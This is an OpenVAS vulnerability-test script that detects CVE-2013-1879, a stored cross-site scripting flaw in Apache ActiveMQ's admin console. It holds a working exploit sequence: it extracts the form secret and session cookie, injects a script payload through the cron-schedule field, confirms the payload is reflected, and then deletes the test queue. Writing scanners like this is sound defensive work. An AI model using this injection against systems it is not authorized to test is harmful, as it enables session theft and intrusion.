###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_activemq_cron_jobs_xss_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Apache ActiveMQ 'Cron Jobs' Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "
  Impact Level: Application";

if (description)
{
  script_id(803866);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-1879");
  script_bugtraq_id(61142);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-08-13 14:52:49 +0530 (Tue, 13 Aug 2013)");
  script_name("Apache ActiveMQ 'Cron Jobs' Cross Site Scripting Vulnerability");

  tag_summary =
"This host is installed with Apache ActiveMQ and is prone to cross site
scripting vulnerability.";

  tag_vuldetect =
"Send a Crafted HTTP POST request and check whether it is able to read the
cookie or not.";

  tag_insight =
"Flaws is due to an improper validation of the command in a user crontab file
upon processing by the scheduled.jsp script.";

  tag_impact =
"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.";

  tag_affected =
"Apache ActiveMQ 5.8.0 and prior";

  tag_solution =
"Upgrade to version 5.9.0 or later,
For Updates refer to http://activemq.apache.org";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.com/92976");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/54073");
  script_xref(name : "URL" , value : "https://issues.apache.org/jira/browse/AMQ-4397");
  script_summary("Check if Apache ActiveMQ is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8161);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
req = "";
res = "";
url = "";
secKey = "";
cookie = "";

## Get HTTP Port
port = get_http_port(default:8161);
if(!port){
  port = 8161;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list("", "/apache", "/activemq", "/mq", cgi_dirs()))
{
  ## Send and Recieve the response
  req = http_get(item:string(dir,"/index.html"), port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm the application
  if(">ActiveMQ<" >< res && "Apache Software" >< res)
  {
    url = '/admin/send.jsp';

    req = http_get(item:url,  port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if(res && res =~ "HTTP/1.. 200 OK" && "Send Messages" >< res)
    {
      ## Extract the secret key
      secKey = eregmatch(string: res, pattern: "<input type=.hidden. name=.secret. value=.([a-z0-9\-]+)");
      if(!secKey[1]) exit(0);

      ## Extract cookie
      cookie = eregmatch(pattern:"Set-Cookie: JSESSIONID=([0-9a-z]*);", string:res);
      if(!cookie[1]) exit(0);

      url = "/admin/sendMessage.action";

      postData = string("secret=",secKey[1],"&JMSDestination=xss-test&",
                        "JMSDestinationType=queue&JMSCorrelationID=&JM",
                        "SReplyTo=&JMSPriority=&JMSType=&JMSTimeToLive",
                        "=&JMSXGroupID=&JMSXGroupSeq=&AMQ_SCHEDULED_DE",
                        "LAY=&AMQ_SCHEDULED_PERIOD=&AMQ_SCHEDULED_REPE",
                        "AT=&AMQ_SCHEDULED_CRON=*+*+*+*+*%22%3E%3Cscri",
                        "pt%3Ealert%28document.cookie%29%3C%2Fscript%3",
                        "E&JMSMessageCount=1&JMSMessageCountHeader=JMS",
                                             "XMessageCounter&JMSText=");

      ## Construct the POST data with the crafted request
      req = string("POST ",url," HTTP/1.1\r\n",
                   "Host: ", host,"\r\n",
                   "Cookie: JSESSIONID=",cookie[1],"\r\n",
                   "Content-Type: application/x-www-form-urlencoded\r\n",
                   "Content-Length: ", strlen(postData),"\r\n",
                   "\r\n",
                   postData);

      ## Send the crafted request and recieve the responce
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

      if(res && res =~ "HTTP/1.. 302 Found" && res =~ "Location:.*/admin/queues.jsp")
      {
        url = "/admin/browse.jsp?JMSDestination=xss-test";

        ## Confirm the Exploit by accessing the stored xss multiple times
        for(i=0;i<3;i++)
        {
          if(http_vuln_check(port:port, url:url, check_header:TRUE,
                pattern:"<script>alert\(document.cookie\)</script>",
                                       extra_check:"SCHEDULED_CRON"))
          {
            ## Delete the stored content
            url = '/admin/queues.jsp';
            req = http_get(item:url,  port:port);
            res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

            if(res && res =~ "HTTP/1.. 200 OK")
            {
              ## Extract the secret key
              secKey = eregmatch(string: res, pattern: "<input type=.hidden. name=.secret. value=.([a-z0-9\-]+)");
              if(!secKey[1]) exit(0);

              ## Extract cookie
              cookie = eregmatch(pattern:"Set-Cookie: JSESSIONID=([0-9a-z]*);", string:res);
              if(!cookie[1]) exit(0);

              url = string("/admin/deleteDestination.action?JMSDestination=xss-test&",
                           "JMSDestinationType=queue&secret=",secKey[1]);

              ## Construct the get request to Delete the stored data
              req = string("GET ",url," HTTP/1.1\r\n",
                           "Host: ", host,"\r\n",
                           "Cookie: JSESSIONID=",cookie[1],"\r\n\r\n");
              res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

              ## Confirm the stored data is deleted
              if(res && res =~ "HTTP/1.. 302 Found" && res =~ "Location:.*/admin/queues.jsp"
                                                    && "xss-test" >!< res)
              {
                security_warning(port);
                exit(0);
              }
            }
          }
        }
      }
    }
  }
}
